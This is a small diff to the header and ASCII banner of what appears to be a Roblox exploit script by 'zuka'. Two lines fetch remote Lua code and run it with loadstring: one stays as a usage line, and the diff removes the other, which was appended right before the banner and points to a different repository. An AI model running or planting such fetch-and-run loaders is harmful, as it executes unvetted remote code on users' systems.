@@ -3,9 +3,7 @@ made by zuka @OverZuka on roblox
 v5.2 December 24th
 github - loadstring(game:HttpGet("https://raw.githubusercontent.com/legalize8ga-maker/Scripts/refs/heads/main/ZukasSource.lua"))()
 
-loadstring(request({
-    Url = "https://raw.githubusercontent.com/osukfcdays/zlfucker/refs/heads/main/main.luau"
-}).Body)()    ____  __.        ___________    _________ .__     
+__________      ____  __.        ___________    _________ .__     
 \____    /__ __|    |/ _|____    \__    ___/___ \_   ___ \|  |__  
   /     /|  |  \      < \__  \     |    |_/ __ \/    \  \/|  |  \ 
  /     /_|  |  /    |  \ / __ \_   |    |\  ___/\     \___|   Y  \
